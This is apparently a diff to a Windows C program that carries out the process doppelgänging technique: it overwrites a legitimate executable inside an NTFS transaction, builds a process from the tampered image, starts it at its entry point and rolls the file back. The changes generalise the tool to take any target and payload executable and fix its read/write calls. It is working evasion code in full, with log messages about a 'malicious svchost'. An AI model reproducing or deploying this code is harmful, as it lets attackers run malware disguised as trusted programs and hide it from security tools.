@@ -103,28 +103,28 @@ LPVOID GetBaseAddressByName(HANDLE hProcess)
 	return NULL;
 }
 
-int main(int argc,char *argv[] )
+int main(int argc, char *argv[])
 {
 
 	LARGE_INTEGER liFileSize;
 	DWORD dwFileSize;
 	HANDLE hSection;
 	NTSTATUS ret;
-	
+
 	UNICODE_STRING  string;
 	if (argc < 3) {
-		printf("%s <exe to Doppelgang> <your exe>",argv[0]);
+		printf("%s <exe to Doppelgang> <your exe>", argv[0]);
 		return 0;
 	}
 	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
-	if (NULL==hNtdll)
+	if (NULL == hNtdll)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
 	printf("[+] Got ntdll.dll at 0x%llx\n", hNtdll);
 	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
-	
+
 	if (NULL == createSection)
 	{
 		DisplayErrorText(GetLastError());
@@ -132,7 +132,7 @@ int main(int argc,char *argv[] )
 	}
 	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);
 
-	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0,L"svchost.exe");
+	HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, L"doppelgang_test");
 	if (INVALID_HANDLE_VALUE == hTransaction)
 	{
 		DisplayErrorText(GetLastError());
@@ -140,23 +140,23 @@ int main(int argc,char *argv[] )
 	}
 	printf("[+] Created a transaction, handle 0x%x\n", hTransaction);
 
-	HANDLE hTransactedFile = CreateFileTransacted("svchost.exe",
+	HANDLE hTransactedFile = CreateFileTransacted(argv[1],
 		GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
 	if (INVALID_HANDLE_VALUE == hTransactedFile)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] CreateFileTransacted on svchost, handle 0x%x\n", hTransactedFile);
+	printf("[+] CreateFileTransacted on %s, handle 0x%x\n", argv[1], hTransactedFile);
 
 	HANDLE hExe = CreateFile(argv[2],
-		 GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == hExe)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] opened malexe.exe, handle 0x%x\n", hExe);
+	printf("[+] Opened %s, handle 0x%x\n", argv[2], hExe);
 
 	BOOL err = GetFileSizeEx(hExe, &liFileSize);
 	if (FALSE == err)
@@ -165,7 +165,7 @@ int main(int argc,char *argv[] )
 		return -1;
 	}
 	dwFileSize = liFileSize.LowPart;
-	printf("[+] malexe size is 0x%x\n", dwFileSize);
+	printf("[+] %s size is 0x%x\n", argv[2], dwFileSize);
 
 	BYTE *buffer = malloc(dwFileSize);
 	if (NULL == buffer)
@@ -173,31 +173,33 @@ int main(int argc,char *argv[] )
 		printf("Malloc failed\n");
 		return -1;
 	}
-	printf("[+] allocated 0x%x bytes\n", dwFileSize);
+	printf("[+] Allocated 0x%x bytes\n", dwFileSize);
 
-	if (FALSE == ReadFile(hExe, buffer, dwFileSize, NULL, NULL))
+	// Fix for 32-bit, ReadFile/WriteFile requires a DWORD pointer to receive number of bytes read/written.
+	DWORD dwBytes;
+	if (FALSE == ReadFile(hExe, buffer, dwFileSize, &dwBytes, NULL))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] read malexe.exe to buffer\n");
+	printf("[+] Read %s to buffer\n", argv[2]);
 
-	
-	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, NULL, NULL))
+
+	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, &dwBytes, NULL))
 
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] over wrote svchost in transcation\n");
+	printf("[+] Overwrote %s in transcation\n", argv[1]);
 
 	ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
-	if(FALSE == NT_SUCCESS(ret))
+	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] created a section with our new malicious svchost\n");
+	printf("[+] Created a section with our injected process\n");
 
 
 
@@ -209,7 +211,7 @@ int main(int argc,char *argv[] )
 	}
 	printf("[+] Got NtCreateProcessEx 0x%08p\n", createProcessEx);
 
-	HANDLE hProcess=0;
+	HANDLE hProcess = 0;
 	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
 	WCHAR temp[MAX_PATH] = { 0 };
 	char temp2[MAX_PATH] = { 0 };
@@ -218,8 +220,8 @@ int main(int argc,char *argv[] )
 	MultiByteToWideChar(CP_UTF8, 0, temp2, strlen(temp2), temp, MAX_PATH);
 	initUnicodeString(&string, temp);
 
-	ret = createProcessEx(&hProcess, GENERIC_ALL,NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
-	
+	ret = createProcessEx(&hProcess, GENERIC_ALL, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+
 	printf("[+] Created our process, handle 0x%x\n", hProcess);
 	if (FALSE == NT_SUCCESS(ret))
 	{
@@ -233,10 +235,10 @@ int main(int argc,char *argv[] )
 
 	ULONGLONG oep = ntHeader->OptionalHeader.AddressOfEntryPoint;
 
-	oep+=(ULONGLONG)GetBaseAddressByName(hProcess);
+	oep += (ULONGLONG)GetBaseAddressByName(hProcess);
 
 
-	printf("[+] our new process oep is 0x%llx\n", oep);
+	printf("[+] Our new process oep is 0x%llx\n", oep);
 	NtCreateThreadEx createThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
 	if (NULL == createThreadEx)
 	{
@@ -257,31 +259,31 @@ int main(int argc,char *argv[] )
 
 
 
-	
-	ret = createProcessParametersEx(&ProcessParams, &string,NULL,NULL,&string,NULL,NULL,NULL,NULL,NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+
+	ret = createProcessParametersEx(&ProcessParams, &string, NULL, NULL, &string, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] creating Process Parameters\n");
+	printf("[+] Creating process parameters\n");
 
 	LPVOID RemoteProcessParams;
-	RemoteProcessParams = VirtualAllocEx(hProcess, ProcessParams, (DWORD)ProcessParams&0xffff + ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
-	if(NULL == RemoteProcessParams)
+	RemoteProcessParams = VirtualAllocEx(hProcess, ProcessParams, (DWORD)ProcessParams & 0xffff + ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (NULL == RemoteProcessParams)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] creating memory at process for our paramters 0x%08x\n", RemoteProcessParams);
+	printf("[+] Creating memory at process for our paramters 0x%08x\n", RemoteProcessParams);
 
-	ret=WriteProcessMemory(hProcess, ProcessParams, ProcessParams, ProcessParams->EnvironmentSize + ProcessParams->MaximumLength,NULL);
+	ret = WriteProcessMemory(hProcess, ProcessParams, ProcessParams, ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, NULL);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] writing our paramters to the process\n");
+	printf("[+] Writing our paramters to the process\n");
 
 	my_NtQueryInformationProcess queryInformationProcess = (my_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
 	if (NULL == queryInformationProcess)
@@ -308,13 +310,13 @@ int main(int argc,char *argv[] )
 
 	PEB *peb = info.PebBaseAddress;
 
-	ret=WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParams, sizeof(LPVOID), NULL);
+	ret = WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParams, sizeof(LPVOID), NULL);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] writing our paramters to the process peb 0x%08x\n", peb);
+	printf("[+] Writing our paramters to the process peb 0x%08x\n", peb);
 
 	HANDLE hThread;
 	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, FALSE, 0, 0, 0, NULL);
@@ -329,7 +331,7 @@ int main(int argc,char *argv[] )
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] rolling back the original svchost\n");
+	printf("[+] Rolling back the original %s\n", argv[1]);
 
 	CloseHandle(hProcess);
 	CloseHandle(hExe);
